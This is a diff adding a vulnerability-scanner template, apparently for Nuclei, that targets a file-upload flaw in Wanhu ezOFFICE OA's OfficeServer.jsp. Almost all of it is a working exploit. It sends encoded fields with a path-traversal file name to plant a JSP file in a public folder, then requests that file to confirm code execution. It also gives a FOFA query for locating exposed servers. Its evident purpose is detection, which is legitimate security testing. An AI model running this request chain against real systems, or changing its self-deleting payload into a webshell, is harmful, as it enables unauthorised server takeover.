@@ -1,0 +1,45 @@
+id: wanhu-ezoffice-officeserver-fileupload
+
+info:
+  name: Wanhu ezOFFICE OA OfficeServer File Upload
+  author: Co5mos
+  severity: critical
+  description: |
+    万户 ezOFFICE OA `officeserver` 存在文件上传漏洞，攻击者可通过漏洞上传 webshell，从而控制 web 服务器的权限。
+  metadata:
+    verified: true
+    fofa-query: 'banner="OASESSIONID" && banner="/defaultroot/"'
+  tags: fileupload, wanhu, ezoffice, rce
+
+variables:
+  filename: "{{rand_base(6)}}.jsp"
+  filepath: '{{base64("//../../public/edit/{{filename}}")}}'
+  num1: "{{rand_int(10000, 20000)}}"
+  num2: "{{rand_int(10000, 20000)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        DBSTEP V3.0     145             0               106             DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU=
+        RECORDID=
+        isDoc=dHJ1ZQ==
+        moduleType=Z292ZG9jdW1lbnQ=
+        FILETYPE={{filepath}}
+        <% out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+      - |
+        GET /defaultroot/public/edit/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(body_2, "{{result}}")
+        condition: and
